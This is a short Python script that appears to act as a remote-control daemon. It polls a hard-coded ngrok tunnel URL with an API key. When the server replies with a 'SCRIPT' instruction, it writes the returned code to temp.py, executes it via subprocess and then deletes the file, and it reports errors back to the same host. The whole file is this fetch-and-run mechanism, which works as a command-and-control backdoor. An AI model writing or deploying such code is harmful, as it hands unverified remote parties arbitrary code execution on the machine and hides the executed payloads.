import requests
import subprocess
import json
import os
import logging
import traceback

api_key = "3412423422" # test api key
source = "https://0929-2a02-c7e-2818-f900-b9d3-8fa0-3a86-9809.ngrok-free.app"

# Set up logging
logging.basicConfig(filename='error_log.log', level=logging.ERROR)

def log_and_send_error(exc):
    error_message = str(exc)
    logging.error(error_message)
    error_traceback = traceback.format_exc()
    logging.error(error_traceback)
    send_error_to_backend(error_message, error_traceback)

def send_error_to_backend(message, traceback):
    # Implement the sending of the error details to the backend
    payload = {'message': message, 'traceback': traceback}
    response = requests.post(source + '/error_log', headers={'X-Api-Key': api_key}, json=payload)
    # Check the response if necessary

try:
    # Ping the server
    response = requests.post(source + '/daemon_check', headers={'X-Api-Key': api_key})

    # If the response contains instructions
    if response.status_code == 200:
        instructions = response.json()

        # If the instruction is to run a script
        if instructions['type'] == 'SCRIPT':
            script = instructions['code']
            with open('temp.py', 'w') as f:
                f.write(script)
            subprocess.run(["python3", "temp.py"])
            
            # Delete the temporary file after running the script
            os.remove("temp.py")
        elif instructions['type'] == 'PING':
            print("PINGGG")

except Exception as e:
    log_and_send_error(e)
